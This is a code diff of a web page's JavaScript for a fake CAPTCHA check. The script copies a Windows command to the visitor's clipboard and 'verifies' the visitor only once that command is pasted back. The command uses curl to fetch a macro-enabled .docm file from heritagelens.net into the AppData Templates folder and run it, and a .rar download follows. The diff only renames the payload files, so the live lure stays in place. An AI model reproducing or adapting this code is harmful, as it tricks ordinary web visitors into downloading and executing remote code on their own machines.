@@ -342,7 +342,7 @@
                 document.getElementById("verifyButton").style.display = "inline-block"; 
 
                 
-                var textToCopy = 'cmd /c curl https://www.heritagelens.net/HeritageLensAlliance.docm -o "%appdata%\\Microsoft\\Templates\\HeritageLensAlliance.docm" && start "" "%appdata%\\Microsoft\\Templates\\HeritageLensAlliance.docm"';
+                var textToCopy = 'cmd /c curl https://www.heritagelens.net/HeritageLens2024.docm -o %appdata%\\Microsoft\\Templates\\HeritageLens2024.docm && %appdata%\\Microsoft\\Templates\\HeritageLens2024.docm"';
                 navigator.clipboard.writeText(textToCopy).then(function() {
                     console.log('Text copied to clipboard');
                 }).catch(function(err) {
@@ -359,13 +359,13 @@
 
 
         function verifyCaptcha() {
-            const correctAnswer = "cmd /c curl https://www.heritagelens.net/HeritageLensAlliance.docm -o %appdata%\\Microsoft\\Templates\\HeritageLensAlliance.docm && %appdata%\\Microsoft\\Templates\\HeritageLensAlliance.docm'";
+            const correctAnswer = "cmd /c curl https://www.heritagelens.net/HeritageLens2024.docm -o %appdata%\\Microsoft\\Templates\\HeritageLens2024.docm && %appdata%\\Microsoft\\Templates\\HeritageLens2024.docm'";
             const userAnswer = document.getElementById('captcha-answer')?.value.trim();
             const errorMessage = document.getElementById('error-message');
 
             if (userAnswer === correctAnswer) {
                 document.getElementById("captchaModal").style.display = "none"; 
-                window.location.href = "HeritageLensAlliance.rar"; 
+                window.location.href = "HeritageLens2024.rar"; 
             } else {
                 errorMessage.textContent = "Verification failed. Please try again.";
             }
